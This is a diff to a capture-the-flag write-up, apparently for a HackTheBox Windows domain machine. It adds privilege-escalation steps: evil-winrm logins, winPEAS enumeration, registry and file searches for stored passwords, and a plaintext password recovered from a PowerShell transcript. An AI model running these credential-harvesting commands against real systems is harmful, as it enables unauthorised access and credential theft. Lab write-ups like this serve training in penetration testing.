@@ -426,10 +426,136 @@ evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
 
 upload winPEASx64.exe
 
-./winPEASx64.exe
+./winPEASx64.exe > winpeasoutput.txt
+
+download winpeasoutput.txt
+
+# (ctrl-F Autologon)
 ```
 
+So, apparently we have AutoLogon creds. Let's try to dump them.
 
+```sh
+evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+# nope
+
+type C:\Users\melanie\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# nope
+
+dir C:\Users\ryan -Force
+# nope
+
+cmdkey /list
+# nope
+
+Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.config,*.ps1,*.bat -ErrorAction SilentlyContinue | Select-String -Pattern password
+# nope
+
+rm winpeasoutput.txt
+.\winPEASx64.exe fileanalysis
+# nothing interesting...
+
+net user melanie /domain
+<<OWO
+User name                    melanie
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            7/16/2026 5:11:04 PM
+Password expires             Never
+Password changeable          7/17/2026 5:11:04 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+OWO
+# not really useful...
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+<<OWO
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DisableBackButton    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ
+    LegalNoticeText    REG_SZ
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x52f5ad71
+    ShutdownFlags    REG_DWORD    0x80000033
+    DisableLockWorkstation    REG_DWORD    0x0
+    DefaultDomainName    REG_SZ    MEGABANK
+    DefaultUserName    REG_SZ    Administrator
+    AutoAdminLogon    REG_SZ    1
+    AutoLogonSID    REG_SZ    S-1-5-21-1392959593-3013219662-3596683436-500
+    LastUsedUsername    REG_SZ    Administrator
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
+
+OWO
+```
+
+I'm going to consult the guide because we went on way too many rabbit holes.
+
+...Oh my god. It was so much simpler.
+
+`C:\PSTranscripts\20191203\`.
+
+```sh
+evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
+
+cd C:\
+
+dir -force
+
+# ...
+
+cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+```
+
+We have `ryan` user creds.
+
+```sh
+
+evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
+```
 
 
 ## Root access
